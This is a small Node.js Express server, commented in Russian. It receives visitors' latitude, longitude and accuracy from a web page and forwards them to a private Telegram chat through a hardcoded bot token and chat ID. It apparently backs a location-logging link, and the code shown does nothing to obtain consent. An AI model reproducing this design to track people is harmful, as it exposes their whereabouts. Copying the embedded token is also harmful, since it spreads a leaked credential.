const express = require('express');
const fetch = require('node-fetch');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static(__dirname));

// ОТДАЁМ index.html из КОРНЯ!
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/send-location', async (req, res) => {
  const { latitude, longitude, accuracy } = req.body;

  const telegramToken = '7405407984:AAGwudecZWnjOnDAhMpD6mXx-c3Et8TNAVk';
  const chatId = '5419723549';

  const text = `Новая геолокация:\nШирота: ${latitude}\nДолгота: ${longitude}\nТочность: ${accuracy} м`;

  const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;

  await fetch(url, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({ chat_id: chatId, text: text })
  });

  res.send('ok');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Server running on port', PORT));
